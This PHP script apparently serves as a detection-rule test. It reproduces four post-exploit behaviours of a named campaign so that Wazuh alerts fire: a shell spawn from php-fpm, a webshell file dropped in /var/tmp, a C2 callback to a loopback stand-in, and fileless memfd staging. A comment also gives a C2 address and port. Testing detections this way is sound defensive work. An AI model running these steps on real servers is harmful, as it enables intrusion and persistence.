<?php
// SBOB-EXAMPLES DEMO WATERMARK — scenario B: the FOUR POST-EXPLOIT BEHAVIORS
// reconstructed from the PHP2Shell campaign (CVE-2026-109618 /
// CVE-2026-109619). DEMO ONLY, executed FOR REAL inside the disposable
// php-fpm container (in-worker, like the real RCEs) but with loopback-only
// stand-ins (TDS §4): the C2 is 127.0.0.1:4444, never the real
// 45.155.148.12:4444. The dropped webshell is inert watermark content and is
// never served (/var/tmp is not the web root).
//
// behavior -> contract violation -> expected Wazuh rule (slot 1 band):
//   1. /bin/sh spawn from the worker (CVE-2026-109618 follow-on) -> 100111
//   2. webshell drop to /var/tmp (undeclared write)               -> 100121
//   3. C2 connect, loopback stand-in (CVE-2026-109619)            -> 100131
//   4. memfd_create staging via FFI (fileless variant)            -> 100163
header('Content-Type: text/plain');

echo "behaviors: begin\n";

// Behavior 1: /bin/sh spawn from the php-fpm worker.
// shell_exec() execve("/bin/sh", ["/bin/sh", "-c", "id > /var/tmp/.pwned"])
// — the exact corpus shape. php-fpm declares no shell exec: drift by
// definition.
$out = shell_exec('id > /var/tmp/.pwned');
echo "behaviors: b1 /bin/sh spawn done\n";

// Behavior 2: webshell drop to /var/tmp (undeclared write). Inert content;
// never reachable over HTTP from /var/tmp.
file_put_contents(
    '/var/tmp/.php2shell.php',
    "<?php\n// SBOB-EXAMPLES DEMO WATERMARK — inert webshell stand-in, scenario B.\n// Never served: /var/tmp is not the web root. Demo only (TDS §4).\necho 'sbob-demo';\n"
);
echo "behaviors: b2 webshell dropped to /var/tmp/.php2shell.php\n";

// Behavior 3: C2 connect — LOOPBACK STAND-IN for the reverse-shell callback
// (CVE-2026-109619). Performed in-worker (fsockopen) because the generated
// audit fragment is exe-scoped: only connects by php-fpm itself carry the
// sbob-connect-php-fpm key. The corpus models the post-shell variant
// (comm="sh"); both are undeclared-peer drift.
$fp = @fsockopen('127.0.0.1', 4444, $errno, $errstr, 3.0);
if ($fp) {
    fwrite($fp, "GET / HTTP/1.0\r\nHost: c2-standin\r\n\r\n");
    fclose($fp);
    echo "behaviors: b3 C2 stand-in 127.0.0.1:4444 connected\n";
} else {
    echo "behaviors: b3 C2 connect failed: $errstr ($errno)\n";
}

// Behavior 4: memfd_create staging via FFI (fileless variant) — the
// signature-rule event (T1620 execution-from-memory, node-scoped key).
try {
    $ffi = FFI::cdef('int memfd_create(const char *name, unsigned int flags);');
    $fd = $ffi->memfd_create('php2shell', 0);
    echo $fd >= 0
        ? "behaviors: b4 memfd_create fd=$fd (fileless staging)\n"
        : "behaviors: b4 memfd_create failed\n";
    if ($fd >= 0) {
        // close without executing: staging the fd is the detectable act;
        // actually executing a payload is unnecessary for the demo
        $close = FFI::cdef('int close(int fd);');
        $close->close($fd);
    }
} catch (Throwable $e) {
    echo "behaviors: b4 FFI error: " . $e->getMessage() . "\n";
}

echo "behaviors: end\n";
